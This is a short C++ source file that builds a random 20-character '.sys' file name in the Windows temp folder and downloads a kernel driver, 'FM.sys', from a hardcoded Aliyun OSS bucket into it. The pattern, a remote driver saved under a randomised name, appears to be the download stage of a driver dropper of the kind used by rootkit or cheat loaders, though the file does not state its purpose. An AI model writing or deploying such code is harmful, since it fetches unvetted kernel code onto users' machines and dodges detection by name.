// HttpDownFile.cpp : 定义控制台应用程序的入口点。
//

#include "w3c.h"
#include <iostream>
#include <Windows.h>
#include <winnt.h>
#include <time.h>
#include "httpdownFile.h"

using namespace std;

static char rnameTable1[] =
{
	'0','1','2','3','4','5',
	'6','7','8','9','a','b',
	'c','d','e','f','g','h',
	'i','j','k','l','n','m',
	'o','p','q','r','s','t',
	'u','v','w','x','y','z',
	'A','B','C','D','E','F',
	'G','H','I','J','K','L',
	'N','M','O','P','Q','R',
	'S','T','U','V','W','X',
	'Y','Z'
};

char * randName1()
{
	static char * driverName = NULL;
	if (!driverName)
	{
		driverName = (char *)malloc(30);
		memset(driverName, 0, 30);
		int size = sizeof(rnameTable1);
		srand(time(NULL));
		int i = 0;
		for (i = 0; i < 20; i++)
		{
			driverName[i] = rnameTable1[rand() % size];
		}
		memcpy(driverName + i, ".sys", 4);
	}

	return driverName;
}

std::string httpdownload()
{
	W3Client client;

	char bufPath[MAX_PATH] = { 0 };
	char bufTempPath[MAX_PATH] = { 0 };
	char * driverName = randName1();
	GetTempPathA(MAX_PATH, bufTempPath);
	sprintf_s(bufPath, "%s%s", bufTempPath, driverName);

	std::string str = bufPath;

	if (client.Connect("https://caiba123.oss-cn-beijing.aliyuncs.com/")) {
		if (client.Request("/FM.sys", W3Client::reqGet)) {
			char buf[1024] = { 0 };
			FILE * file = NULL;
			fopen_s(&file, str.c_str(), "wb");
			ULONG len = 0;
			while ((len = client.Response(reinterpret_cast<unsigned char*>(buf), 1024))>0) {
				fwrite(buf, len, 1, file);
				//memset(buf, 0x00, 1024);
			}
			fclose(file);
		}
		client.Close();
	}
	

	return str;
}
